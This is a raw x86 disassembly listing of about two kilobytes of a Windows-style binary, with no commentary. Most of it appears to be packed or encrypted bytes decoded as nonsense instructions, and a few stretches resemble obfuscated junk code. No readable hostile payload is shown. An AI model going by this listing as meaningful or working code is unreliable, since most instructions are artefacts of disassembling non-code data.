  40204b:	fild   WORD PTR [eax+0x1a]
  40204e:	fwait
  40204f:	call   0x9e2442a2
  402054:	fldcw  WORD PTR [edi+eax*2+0x4d]
  402058:	sbb    edx,DWORD PTR [edi]
  40205a:	mov    bh,0x67
  40205c:	xchg   ebx,eax
  40205d:	imul   ebx,ebp,0xfffffffa
  402060:	out    dx,al
  402061:	inc    edi
  402062:	repz scas eax,DWORD PTR es:[edi]
  402064:	mov    dh,0xee
  402066:	sub    eax,0x8fee099b
  40206b:	jbe    0x402002
  40206d:	nop
  40206e:	add    BYTE PTR [eax],bh
  402070:	cmp    ecx,DWORD PTR [ebx+0x45c7e055]
  402076:	aam    0xb9
  402078:	dec    esi
  402079:	add    BYTE PTR [eax],al
  40207b:	mov    DWORD PTR ds:0x42ee24,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e75a,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e762,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi-0x974a9d1],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x402052
  4020cf:	xchg   ah,cl
  4020d1:	mov    eax,ds:0x339ea0bd
  4020d6:	jbe    0x4020ff
  4020d8:	aad    0x78
  4020da:	loop   0x4020e7
  4020dc:	clc    
  4020dd:	mov    dl,0x56
  4020df:	fwait
  4020e0:	in     al,0x79
  4020e2:	mov    cl,0x2d
  4020e4:	xchg   edx,eax
  4020e5:	mov    bh,0xcf
  4020e7:	jne    0x4020e8
  4020e9:	mov    ch,0x96
  4020eb:	mul    ebp
  4020ed:	or     BYTE PTR [ecx-0x53ef25b2],al
  4020f3:	inc    esp
  4020f4:	push   edi
  4020f5:	xchg   ebp,eax
  4020f6:	jne    0x40215c
  4020f8:	call   0xa19a7143
  4020fd:	or     bl,ch
  4020ff:	fld    TBYTE PTR [edi-0x3c]
  402102:	lods   al,BYTE PTR ds:[esi]
  402103:	out    dx,eax
  402104:	es (bad) 
  402106:	loope  0x40209a
  402108:	ins    BYTE PTR es:[edi],dx
  402109:	arpl   WORD PTR [ecx],ax
  40210b:	aaa    
  40210c:	andps  xmm4,XMMWORD PTR [edi]
  40210f:	data16 rcr BYTE PTR [ebp+edi*1+0x4],cl
  402114:	sbb    eax,0xdac591c4
  402119:	ja     0x40211d
  40211b:	cs or  DWORD PTR cs:[edi],esp
  40211f:	ret    
  402120:	sbb    BYTE PTR [ebx-0xd],dl
  402123:	jae    0x40211c
  402125:	call   0x241c:0x4ea5d246
  40212c:	icebp  
  40212d:	mov    cl,0xc
  40212f:	dec    ecx
  402130:	inc    esp
  402131:	inc    edx
  402132:	stc    
  402133:	into   
  402134:	xor    eax,0x690e7f58
  402139:	fwait
  40213a:	push   edx
  40213b:	mov    gs,WORD PTR [ebx-0x34]
  40213e:	pop    ecx
  40213f:	dec    eax
  402140:	retf   0x834f
  402143:	pop    edx
  402144:	js     0x40218c
  402146:	inc    esi
  402147:	repnz fisttp WORD PTR ds:0xcfef8883
  40214e:	inc    edx
  40214f:	in     eax,dx
  402150:	mov    esi,0xfc82feb2
  402155:	push   edx
  402156:	mov    BYTE PTR [edi+0x60],0x4b
  40215a:	or     eax,0xc0f13732
  40215f:	or     eax,0x690e0c8d
  402164:	loope  0x4020f5
  402166:	jmp    FWORD PTR [esi-0x381264ed]
  40216c:	sbb    al,0x1b
  40216e:	pop    edx
  40216f:	(bad)  
  402171:	pop    DWORD PTR [edi+0x62]
  402174:	cld    
  402175:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402176:	bound  esi,QWORD PTR [edi-0x21cbb638]
  40217c:	call   0x2118:0x806c662f
  402183:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402184:	pop    edi
  402185:	mov    ds:0x13b3695b,eax
  40218a:	xor    DWORD PTR [esi+0x4b],esp
  40218d:	dec    edi
  40218e:	or     BYTE PTR [edx-0x71b00f2b],ah
  402194:	xor    DWORD PTR [esi],0x4cbe46a6
  40219a:	stos   DWORD PTR es:[edi],eax
  40219b:	mov    cs,WORD PTR [esi+0x2101facb]
  4021a1:	jmp    0x402124
  4021a3:	nop
  4021a4:	pushf  
  4021a5:	pusha  
  4021a6:	retf   0x63ce
  4021a9:	cdq    
  4021aa:	sti    
  4021ab:	cld    
  4021ac:	add    dh,BYTE PTR [ebp+0x6f]
  4021af:	jo     0x4021c5
  4021b1:	xchg   esi,eax
  4021b2:	dec    ebx
  4021b3:	scas   al,BYTE PTR es:[edi]
  4021b4:	mov    ds:0xecdcf0b8,al
  4021b9:	mov    ds:0xd369d5b7,eax
  4021be:	xchg   edi,eax
  4021bf:	mov    ds:0x3762fc24,al
  4021c4:	adc    BYTE PTR [ebx],ch
  4021c6:	push   ebp
  4021c7:	lock sub eax,0x9dbff2b8
  4021cd:	or     edx,ecx
  4021cf:	in     eax,0x5b
  4021d1:	add    esp,DWORD PTR [ecx-0x12]
  4021d4:	aad    0x8
  4021d6:	fcomp  DWORD PTR [esi-0x3a]
  4021d9:	retf   0x118c
  4021dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021dd:	stos   DWORD PTR es:[edi],eax
  4021de:	pop    ebx
  4021df:	int3   
  4021e0:	pushf  
  4021e1:	xor    esi,DWORD PTR [esi]
  4021e3:	or     BYTE PTR [esi-0x72],0x7a
  4021e7:	ret    0x1180
  4021ea:	push   0x541b4a91
  4021ef:	popf   
  4021f0:	adc    edx,0xfffffff6
  4021f3:	xchg   edi,eax
  4021f4:	data16 std 
  4021f6:	mov    ch,0xef
  4021f8:	addr16 mov dl,0xfd
  4021fb:	loop   0x40222c
  4021fd:	nop
  4021fe:	mov    esp,0xce8e8309
  402203:	loopne 0x40222a
  402205:	ja     0x4021dc
  402207:	int    0x92
  402209:	mov    BYTE PTR [eax-0x714a8290],cl
  40220f:	sbb    al,0xc8
  402211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402212:	pop    esp
  402213:	dec    ebx
  402214:	push   eax
  402215:	push   ds
  402216:	push   eax
  402217:	xchg   esi,eax
  402218:	add    DWORD PTR [ebp+ecx*2+0x3848059c],edx
  40221f:	xor    al,0x17
  402221:	iret   
  402222:	(bad)  
  402224:	jne    0x402247
  402226:	dec    ecx
  402227:	test   edx,ebp
  402229:	sub    BYTE PTR [esi],cl
  40222b:	ret    
  40222c:	fucomi st,st(3)
  40222e:	sbb    BYTE PTR [esp+ebx*1],bl
  402231:	addr16 dec ebp
  402233:	outs   dx,BYTE PTR ds:[esi]
  402234:	gs sbb al,0x44
  402237:	in     eax,dx
  402238:	jl     0x40225a
  40223a:	adc    BYTE PTR [edx-0x1f71328f],cl
  402240:	adc    ebp,DWORD PTR [edx+0xc]
  402243:	ret    
  402244:	mov    bh,0x4f
  402246:	xor    ch,BYTE PTR [edx]
  402248:	add    DWORD PTR [edx],0x3fab4221
  40224e:	(bad)  
  40224f:	mov    ah,0xb0
  402251:	popa   
  402252:	jmp    FWORD PTR [esp+edi*1-0x51dcf739]
  402259:	pop    edi
  40225a:	outs   dx,DWORD PTR ds:[esi]
  40225b:	mov    esi,0x5de7fcbf
  402260:	ret    
  402261:	cdq    
  402262:	cmp    DWORD PTR [esp+eax*2+0x2a1c30fc],ebp
  402269:	and    al,0xf7
  40226b:	xchg   ebx,eax
  40226c:	xor    DWORD PTR [ecx],edi
  40226e:	je     0x402277
  402270:	pop    es
  402271:	ret    0xa71d
  402274:	adc    cl,al
  402276:	xor    BYTE PTR [edx+eiz*1],0x8b
  40227a:	retf   0xa120
  40227d:	mov    gs,WORD PTR [edi+0x10]
  402280:	gs popf 
  402282:	imul   edx,edx,0xffffffdb
  402285:	dec    esi
  402286:	in     eax,dx
  402287:	and    al,0x22
  402289:	xchg   ebp,eax
  40228a:	ins    BYTE PTR es:[edi],dx
  40228b:	(bad)  
  40228c:	fldenv [edx-0x44]
  40228f:	mov    dl,0x1e
  402291:	mov    eax,0xcca0936a
  402296:	ins    BYTE PTR es:[edi],dx
  402297:	out    dx,al
  402298:	mov    eax,0xf928e771
  40229d:	dec    esp
  40229e:	add    al,0x29
  4022a0:	cdq    
  4022a1:	and    DWORD PTR [esi],edx
  4022a3:	xor    eax,ecx
  4022a5:	pop    ss
  4022a6:	xchg   esp,eax
  4022a7:	arpl   WORD PTR [esp+edx*1],bx
  4022aa:	inc    ecx
  4022ab:	scas   eax,DWORD PTR es:[edi]
  4022ac:	aam    0x39
  4022ae:	out    0xd3,eax
  4022b0:	test   BYTE PTR [edi+0x3],0x59
  4022b4:	enter  0x1c66,0x94
  4022b8:	jl     0x4022df
  4022ba:	(bad)  
  4022bb:	mov    dl,0xa1
  4022bd:	(bad)  
  4022be:	xlat   BYTE PTR ds:[ebx]
  4022bf:	mov    ecx,DWORD PTR [eax+0x1e]
  4022c2:	and    eax,0xd916a2b3
  4022c7:	(bad)  ds:0x3b1236f
  4022cd:	in     eax,dx
  4022ce:	inc    esp
  4022cf:	cmp    dh,BYTE PTR [eax-0x4bd70841]
  4022d5:	and    eax,0xe36f3bf1
  4022da:	ins    DWORD PTR es:[edi],dx
  4022db:	cmp    DWORD PTR [ebp-0x50],edi
  4022de:	fs sub al,0x4c
  4022e1:	ret    0x8b2d
  4022e4:	push   0x41
  4022e6:	mov    eax,0x79a18a36
  4022eb:	sbb    eax,DWORD PTR [eax-0xc]
  4022ee:	nop
  4022ef:	pop    ebx
  4022f0:	aad    0xf
  4022f2:	es mov ah,0x9c
  4022f5:	(bad)  
  4022f6:	jmp    0x97685e23
  4022fb:	rcr    DWORD PTR [eax],0xc1
  4022fe:	mov    ebx,0x5d10e6e2
  402303:	dec    ebp
  402304:	add    eax,0x211f07c0
  402309:	add    al,bl
  40230b:	pop    ebp
  40230c:	pushf  
  40230d:	outs   dx,BYTE PTR ds:[esi]
  40230e:	mov    ebx,0x7e54fd0d
  402313:	mov    al,0x69
  402315:	iret   
  402316:	dec    ebx
  402317:	popa   
  402318:	xchg   esi,eax
  402319:	lods   al,BYTE PTR ds:[esi]
  40231a:	xchg   ebp,eax
  40231b:	push   0xfffffff7
  40231d:	(bad)  
  402321:	ret    
  402322:	and    al,0x74
  402324:	(bad)  
  402326:	test   DWORD PTR [edx],eax
  402328:	and    BYTE PTR [edi-0x2b],0xb7
  40232c:	ds pop ebx
  40232e:	mov    al,ds:0xfdc2e5
  402333:	popa   
  402334:	fst    QWORD PTR [eax]
  402336:	inc    esp
  402337:	out    0x95,eax
  402339:	jnp    0x40239e
  40233b:	mov    bl,0x3c
  40233d:	lahf   
  40233e:	dec    edi
  40233f:	cmova  edi,DWORD PTR [esi]
  402342:	mov    eax,eax
  402344:	out    dx,al
  402345:	arpl   di,si
  402347:	jp     0x402375
  402349:	push   0x58c22406
  40234e:	mov    dh,0x14
  402350:	inc    ecx
  402351:	leave  
  402352:	xlat   BYTE PTR ds:[ebx]
  402353:	rcr    DWORD PTR [ecx],0x89
  402356:	(bad)  
  402359:	leave  
  40235a:	xor    eax,0x45b0786f
  40235f:	pop    esp
  402360:	inc    ebx
  402361:	inc    ebx
  402362:	or     DWORD PTR [esi],0x95189406
  402368:	test   al,0x96
  40236a:	xchg   esi,eax
  40236b:	dec    edx
  40236c:	cwde   
  40236d:	cmp    DWORD PTR [ebx-0x43],ebx
  402370:	sbb    dl,dl
  402372:	jno    0x4023b1
  402374:	or     DWORD PTR [ebp-0x78cfb487],0x18
  40237b:	cli    
  40237c:	xor    BYTE PTR [edi-0x149899ba],bl
  402382:	xor    ebp,DWORD PTR [edi-0x66a1e383]
  402388:	fdiv   DWORD PTR [eax]
  40238a:	fist   WORD PTR [eax]
  40238c:	pop    ebp
  40238d:	test   BYTE PTR ds:0x991e62e3,cl
  402393:	mov    ebp,0x50eee573
  402398:	je     0x40232d
  40239a:	out    0xd2,al
  40239c:	outs   dx,BYTE PTR ds:[esi]
  40239d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40239e:	jmp    0x40238e
  4023a0:	pop    ebp
  4023a1:	jmp    0x4023da
  4023a3:	out    dx,al
  4023a4:	test   BYTE PTR [eax-0x305434b6],dl
  4023aa:	ds lahf 
  4023ac:	loop   0x40236d
  4023ae:	xor    edx,edi
  4023b0:	les    edx,FWORD PTR [edx+0x1c]
  4023b3:	cdq    
  4023b4:	add    esp,DWORD PTR [esi-0x2d]
  4023b7:	gs jmp 0x40235f
  4023ba:	int    0xd0
  4023bc:	mov    ds:0x7d6d9bea,eax
  4023c1:	xor    DWORD PTR [eax+0x38],edx
  4023c4:	pop    esp
  4023c5:	xchg   DWORD PTR [edi-0x1e7bf3ae],edx
  4023cb:	sub    al,BYTE PTR ds:0xbaf6ee86
  4023d1:	dec    edi
  4023d2:	xor    eax,0x9fb62445
  4023d7:	outs   dx,BYTE PTR ds:[esi]
  4023d8:	fwait
  4023d9:	nop    DWORD PTR [edi+0x34d52f23]
  4023e0:	and    eax,0x4016b3af
  4023e5:	retf   
  4023e6:	mov    ch,0x18
  4023e8:	dec    esp
  4023e9:	ss neg edx
  4023ec:	jmp    0x402377
  4023ee:	stos   BYTE PTR es:[edi],al
  4023ef:	outs   dx,BYTE PTR ds:[esi]
  4023f0:	adc    eax,0xca7250fc
  4023f5:	xchg   esp,eax
  4023f6:	aas    
  4023f7:	scas   al,BYTE PTR es:[edi]
  4023f8:	in     al,0xda
  4023fa:	mov    dh,0x97
  4023fc:	jnp    0x4023a6
  4023fe:	popa   
  4023ff:	outs   dx,DWORD PTR ds:[esi]
  402400:	sbb    al,0x6a
  402402:	or     eax,0x2a6219da
  402407:	jae    0x402447
  402409:	add    dh,dl
  40240b:	push   dx
  40240d:	mov    dh,0x77
  40240f:	stos   BYTE PTR es:[edi],al
  402410:	in     eax,dx
  402411:	mov    bh,bh
  402413:	add    esi,ebp
  402415:	push   DWORD PTR [ebp-0x7b]
  402418:	mov    ah,0xb7
  40241a:	mov    edx,0xd54d2dd9
  40241f:	es xchg edi,eax
  402421:	test   al,0x83
  402423:	adc    dl,BYTE PTR [eax+0x21]
  402426:	push   0x352c3aac
  40242b:	dec    edx
  40242c:	push   ecx
  40242d:	test   BYTE PTR [esi+esi*4+0x3f1bbc4e],bl
  402434:	inc    edx
  402435:	out    dx,al
  402436:	loop   0x402475
  402438:	lds    esi,FWORD PTR ds:0xf46e9639
  40243e:	cmp    eax,0xb439271f
  402443:	into   
  402444:	mov    edi,0x3aaf2eda
  402449:	aas    
  40244a:	or     DWORD PTR [esi],edx
  40244c:	sti    
  40244d:	dec    ebp
  40244e:	sbb    DWORD PTR [ecx+0x0],eax
  402451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402452:	xchg   esp,eax
  402453:	stc    
  402454:	and    ch,bl
  402456:	cmp    esp,ebp
  402458:	fwait
  402459:	jne    0x4024af
  40245b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40245c:	mov    edi,0x2134eda8
  402461:	push   ss
  402462:	mov    edx,DWORD PTR [eax]
  402464:	imul   edx,edx,0xf89ea9ee
  40246a:	mov    DWORD PTR ds:0x430546,0x7964
  402474:	mov    DWORD PTR [eax],edx
  402476:	mov    DWORD PTR ds:0x4304be,0x7646
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x4304ba,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	and    eax,0x524d1e46
  4024b7:	movd   DWORD PTR [esi-0x7e],mm7
  4024bb:	jno    0x40253b
  4024bd:	jle    0x4024c9
  4024bf:	and    esp,eax
  4024c1:	sbb    BYTE PTR [ebx+0x4b],ah
  4024c4:	dec    edx
  4024c5:	xor    eax,DWORD PTR [esi+0x32]
  4024c8:	dec    esi
  4024c9:	out    dx,eax
  4024ca:	test   DWORD PTR [ebx+0x29ac4ee7],ecx
  4024d0:	dec    edx
  4024d1:	retf   0x4350
  4024d4:	mov    esi,gs
  4024d6:	clc    
  4024d7:	out    0xd6,eax
  4024d9:	test   al,0xaa
  4024db:	wrmsr  
  4024dd:	push   ebx
  4024de:	test   BYTE PTR [ebx+0x14022344],bh
  4024e4:	or     bl,ah
  4024e6:	cdq    
  4024e7:	add    edx,DWORD PTR [edi+0x4830512e]
  4024ed:	shr    edx,0x0
  4024f0:	les    edx,FWORD PTR [edx+esi*8+0x44f74b14]
  4024f7:	test   ch,dl
  4024f9:	sub    edi,edx
  4024fb:	test   DWORD PTR [esi-0x6862ff36],esi
  402501:	xchg   DWORD PTR [ebx-0x56],eax
  402504:	jb     0x4024f4
  402506:	sti    
  402507:	adc    ecx,edi
  402509:	test   DWORD PTR [eax-0x76],ebp
  40250c:	adc    ch,BYTE PTR [ebx]
  40250e:	adc    al,0x15
  402510:	push   esp
  402511:	push   0xffffffaa
  402513:	shl    BYTE PTR [ecx-0x2873d405],1
  402519:	repnz pop ecx
  40251b:	daa    
  40251c:	pop    ebp
  40251d:	pop    ebp
  40251e:	out    dx,eax
  40251f:	inc    esi
  402520:	repz pop ds
  402522:	cmp    eax,0x67e8fdbd
  402527:	in     eax,0x10
  402529:	fsubr  DWORD PTR [edi]
  40252b:	or     dl,BYTE PTR ds:0x56e54c67
  402531:	scas   al,BYTE PTR es:[edi]
  402532:	jno    0x4024be
  402534:	jl     0x402514
  402536:	sbb    al,BYTE PTR [eax+0xaf77762]
  40253c:	jnp    0x402524
  40253e:	push   0x4c
  402540:	sub    ch,BYTE PTR [esp+eax*4+0x57]
  402544:	inc    eax
  402545:	xor    ah,al
  402547:	inc    ecx
  402548:	icebp  
  402549:	mov    esp,0xe7129e71
  40254e:	ret    0x56a4
  402551:	pushf  
  402552:	ret    0xbdd5
  402555:	aad    0x7
  402557:	daa    
  402558:	xchg   DWORD PTR [ecx-0x3d],esp
  40255b:	adc    DWORD PTR [eax-0x5a086551],edi
  402561:	and    BYTE PTR [edx-0x58],dl
  402564:	push   esp
  402565:	and    eax,0xa532040
  40256a:	add    al,0x78
  40256c:	xchg   BYTE PTR ds:0xc32d9025,ch
  402572:	mov    ah,0xdb
  402574:	rcr    DWORD PTR [edx-0x69],1
  402577:	add    eax,0xf3e64a94
  40257c:	push   0xffffffa0
  40257e:	shr    BYTE PTR [edx-0x2a],1
  402581:	mov    esp,0xad6c8bbb
  402586:	pusha  
  402587:	sbb    eax,0xa5e1588
  40258c:	and    al,0x6f
  40258e:	xor    esp,edx
  402590:	mov    dl,0xe0
  402592:	push   edx
  402593:	mov    dl,0x46
  402595:	xor    al,BYTE PTR [edi+eiz*1]
  402598:	push   ds
  402599:	cmc    
  40259a:	sar    BYTE PTR [edi],1
  40259c:	outs   dx,BYTE PTR ds:[esi]
  40259d:	retf   
  40259e:	mov    ebx,ebp
  4025a0:	add    DWORD PTR [ecx-0x294a4b92],eax
  4025a6:	jo     0x402532
  4025a8:	iret   
  4025a9:	cmp    eax,0x45a3fe49
  4025ae:	dec    edx
  4025af:	push   ebp
  4025b0:	jno    0x4025b4
  4025b2:	mov    al,ds:0x1752f4fd
  4025b7:	sar    BYTE PTR [ecx+0x4f71ea99],1
  4025bd:	mov    bl,0x33
  4025bf:	jmp    0x40255f
  4025c1:	pop    ecx
  4025c2:	jmp    0x1ec0c21c
  4025c7:	out    0x4,eax
  4025c9:	sub    al,0x12
  4025cb:	xor    al,0x86
  4025cd:	std    
  4025ce:	mov    ds:0xb9617a53,eax
  4025d3:	pop    ecx
  4025d4:	or     eax,DWORD PTR ds:0x851077ff
  4025da:	pop    ebx
  4025db:	cmp    esp,ebp
  4025dd:	mov    ah,0x21
  4025df:	aam    0xae
  4025e1:	jae    0x4025cd
  4025e3:	addr16 fwait
  4025e5:	mov    cl,0xc
  4025e7:	adc    eax,0x3330145d
  4025ec:	inc    ecx
  4025ed:	div    BYTE PTR [ebp+0x1e]
  4025f0:	adc    al,0xad
  4025f2:	imul   ecx,DWORD PTR [ebp-0xe],0xfffffffc
  4025f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025f7:	push   0x12
  4025f9:	add    BYTE PTR [ebx+0x3f],0xc
  4025fd:	adc    bh,BYTE PTR [edx-0x1d0a1270]
  402603:	and    al,0xfc
  402606:	fisttp QWORD PTR [edi-0x47]
  402609:	shl    BYTE PTR [eax-0xfd169e7],0xee
  402610:	imul   ebx,DWORD PTR [esi],0x8ca18e2c
  402616:	push   es
  402617:	in     al,dx
  402618:	xor    edi,0xffffff97
  40261b:	inc    ebx
  40261c:	inc    eax
  40261d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40261e:	jecxz  0x402655
  402620:	loopne 0x40264f
  402622:	gs js  0x402623
  402625:	test   BYTE PTR [ebx+0x6e],al
  402628:	push   esp
  402629:	inc    edx
  40262a:	cmp    edi,DWORD PTR [eax+0x63532ab2]
  402630:	fist   WORD PTR [eax]
  402632:	jne    0x40261b
  402634:	mov    ch,0x11
  402636:	mov    al,0xc4
  402638:	dec    esp
  402639:	fwait
  40263a:	cmp    edx,edi
  40263c:	cli    
  40263d:	ss jb  0x4025db
  402640:	mov    al,ds:0x7a6fafeb
  402645:	clc    
  402646:	int3   
  402647:	xor    ecx,DWORD PTR [edi-0x51]
  40264a:	out    0x56,al
  40264c:	js     0x402640
  40264e:	stos   DWORD PTR es:[edi],eax
  40264f:	aad    0x7c
  402651:	lea    edi,es:[esi+eiz*4]
  402655:	jno    0x4026a3
  402657:	ror    DWORD PTR [ebp+0x31],0xe0
  40265b:	das    
  40265c:	sbb    al,0x98
  40265e:	scas   eax,DWORD PTR es:[edi]
  40265f:	or     DWORD PTR [ecx+0x3f],ecx
  402662:	aaa    
  402663:	adc    al,0xe2
  402665:	fwait
  402666:	ss ja  0x4026cd
  402669:	jne    0x402679
  40266b:	push   edi
  40266c:	scas   eax,DWORD PTR es:[edi]
  40266d:	adc    al,dh
  40266f:	enter  0x659d,0xd
  402673:	test   eax,0x86975485
  402678:	loopne 0x40260a
  40267a:	sbb    BYTE PTR [esi-0x51a8fb58],0xe2
  402681:	dec    eax
  402682:	ins    BYTE PTR es:[edi],dx
  402683:	push   esp
  402684:	push   DWORD PTR [eax+0x19069121]
  40268a:	dec    ebx
  40268b:	mov    eax,ds:0x1c0c97aa
  402690:	fldcw  WORD PTR [eax]
  402692:	outs   dx,DWORD PTR ds:[esi]
  402693:	popa   
  402694:	add    BYTE PTR [esi+ebp*2],dh
  402697:	push   eax
  402698:	add    eax,0x24510046
  40269d:	pmaxub mm4,QWORD PTR [edx]
  4026a0:	cmp    eax,0x4a1a7fcf
  4026a5:	mov    edx,0xeb5954db
  4026aa:	cmp    eax,0x229ef547
  4026af:	mov    BYTE PTR [ebp-0x62],al
  4026b2:	es xchg esp,eax
  4026b4:	shl    BYTE PTR gs:[edx-0x2e791b60],cl
  4026bb:	mov    eax,ds:0xf8578ef4
  4026c0:	xchg   esp,eax
  4026c1:	cmp    al,cl
  4026c3:	jle    0x4026e9
  4026c5:	dec    DWORD PTR ds:0x1033d700
  4026cb:	fwait
  4026cc:	retf   0x1ee6
  4026cf:	cdq    
  4026d0:	cld    
  4026d1:	or     edx,esp
  4026d3:	xchg   edi,eax
  4026d4:	test   eax,0x950f8178
  4026d9:	bound  edx,QWORD PTR [ebp-0x47860e92]
  4026df:	inc    ecx
  4026e0:	push   esp
  4026e1:	mov    ch,dl
  4026e3:	enter  0x8706,0xb6
  4026e7:	mov    cl,0xb4
  4026e9:	pop    ebp
  4026ea:	mov    edi,0xc4d59d23
  4026ef:	js     0x4026a6
  4026f1:	sbb    eax,DWORD PTR [ebp-0x63]
  4026f4:	test   al,0x71
  4026f6:	ficomp DWORD PTR [ecx]
  4026f8:	ds mov bl,0x70
  4026fb:	mov    dh,0x62
  4026fd:	or     DWORD PTR [ebp+0x44],ebx
  402700:	out    0xcf,eax
  402702:	sub    ebx,ecx
  402704:	stos   DWORD PTR es:[edi],eax
  402705:	dec    esp
  402706:	mov    cl,0x76
  402708:	pop    esi
  402709:	(bad)  
  40270a:	hlt    
  40270b:	add    al,0xca
  40270d:	sub    BYTE PTR [edx+ebp*2],0xb5
  402711:	les    edi,FWORD PTR [esi-0x3aa7457e]
  402717:	mov    ebx,0x7aff5905
  40271c:	jge    0x402728
  40271e:	rcl    BYTE PTR [eax+edx*4-0x2f5a492f],cl
  402725:	xor    eax,0xf71b41b0
  40272a:	adc    al,BYTE PTR [edi]
  40272c:	sub    eax,0x7c2f89b7
  402731:	ror    BYTE PTR [ebx+eiz*2+0xe7a62c9],cl
  402738:	jmp    0xe3def788
  40273d:	pushf  
  40273e:	pop    ecx
  40273f:	mov    al,0x80
  402741:	aaa    
  402742:	shl    BYTE PTR [ebp-0x2f1bfb5e],0xf
  402749:	loope  0x4027a9
  40274b:	adc    ebp,eax
  40274d:	jo     0x40270e
  40274f:	sbb    bh,bl
  402751:	jo     0x40277e
  402753:	and    esi,ebx
  402755:	xor    bh,BYTE PTR [ecx+0x11187301]
  40275b:	add    ebx,DWORD PTR [ebp-0x1d1856ad]
  402761:	les    esi,FWORD PTR [ebx-0x28]
  402764:	(bad)  
  402765:	or     ah,dl
  402767:	ret    
  402768:	pop    eax
  402769:	shl    BYTE PTR [ebx+0x0],0x2b
  40276d:	pop    esi
  40276e:	call   0x5272:0x2ca85bc8
  402775:	div    dh
  402777:	cdq    
  402778:	inc    ecx
  402779:	loop   0x402761
  40277b:	mov    ebp,0xdb68bf7a
  402780:	jne    0x402725
  402782:	xor    dl,al
  402784:	out    0xca,eax
  402786:	mov    dh,0x85
  402788:	test   al,0xcd
  40278a:	loope  0x4027e7
  40278c:	in     eax,dx
  40278d:	push   ecx
  40278e:	inc    esp
  40278f:	(bad)  
  402790:	mov    al,ds:0x2b06ead0
  402795:	jecxz  0x4027e2
  402797:	loope  0x40278f
  402799:	icebp  
  40279a:	shl    BYTE PTR [ebp+0x55],0xa9
  40279e:	es mov ah,0xad
  4027a1:	repnz sbb DWORD PTR [ebp+0x1b],edi
  4027a5:	cmp    edi,ebp
  4027a7:	xchg   ebx,eax
  4027a8:	scas   eax,DWORD PTR es:[edi]
  4027a9:	and    BYTE PTR [esi],al
  4027ab:	jecxz  0x4027bc
  4027ad:	loope  0x4027e7
  4027af:	push   cs
  4027b0:	jp     0x4027ee
  4027b2:	cli    
  4027b3:	xor    bl,bl
  4027b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027b6:	and    DWORD PTR [edx+0x11],eax
  4027b9:	xor    DWORD PTR [edi+0x54],0xffffffdb
  4027bd:	cli    
  4027be:	mov    ebp,ecx
  4027c0:	jmp    0x5948:0xae68e9bd
  4027c7:	push   edx
  4027c8:	sbb    ebp,DWORD PTR [eax+0xf]
  4027cb:	retf   
  4027cc:	mov    dl,0xd1
  4027ce:	stos   BYTE PTR es:[edi],al
  4027cf:	push   ss
  4027d0:	ret    
  4027d1:	hlt    
  4027d2:	xchg   BYTE PTR [ebp-0x5b],ch
  4027d5:	xor    BYTE PTR [esi+0x4f],bh
  4027d8:	xchg   edi,eax
  4027d9:	cmp    al,0xc3
  4027db:	mov    ds:0x2bd5cb60,al
  4027e0:	aam    0x2f
  4027e2:	push   ss
  4027e3:	jmp    0x402845
  4027e5:	mov    cl,0x72
  4027e7:	cwde   
  4027e8:	outs   dx,BYTE PTR ds:[esi]
  4027e9:	aas    
  4027ea:	fld    QWORD PTR [ebx+0x5fc9fa6d]
  4027f0:	mov    BYTE PTR [ebx+0x6a],ah
  4027f3:	jmp    0x1c12:0xa73fa22a
  4027fa:	out    dx,al
  4027fb:	cli    
  4027fc:	push   es
  4027fd:	je     0x402855
  4027ff:	mov    dl,BYTE PTR [esp]
  402802:	ja     0x402844
  402804:	aaa    
  402805:	scas   eax,DWORD PTR es:[edi]
  402806:	sub    al,0x94
  402808:	xor    al,0xe7
  40280a:	mov    ah,0x9b
  40280c:	or     BYTE PTR [esi-0xbd1e97c],0x6f
  402813:	lock lds edx,FWORD PTR [esi]
  402816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402817:	dec    esp
  402818:	stos   BYTE PTR es:[edi],al
  402819:	in     al,dx
  40281a:	or     al,0xd0
  40281c:	popa   
  40281d:	sbb    al,0x5e
  40281f:	repz mov eax,ds:0xcc113e84
  402825:	jnp    0x4027d4
  402827:	repnz mov edx,0x6c81601b
  40282d:	test   eax,0xdd615109
  402832:	dec    ebp
  402833:	int3   
  402834:	xchg   ebx,eax
  402835:	fbstp  TBYTE PTR [ebp+ecx*4-0x64]
  402839:	lock ret 0x9098
  40283d:	int3   
  40283e:	or     edi,ebx
  402840:	fwait
  402841:	push   edx
  402842:	ret    
  402843:	jae    0x402898
  402845:	pushf  
  402846:	jb     0x40285c
  402848:	and    al,0x8f
  40284a:	in     eax,0xec
  40284c:	jp     0x4028a6
  40284e:	mov    ebp,0x81ab0b91
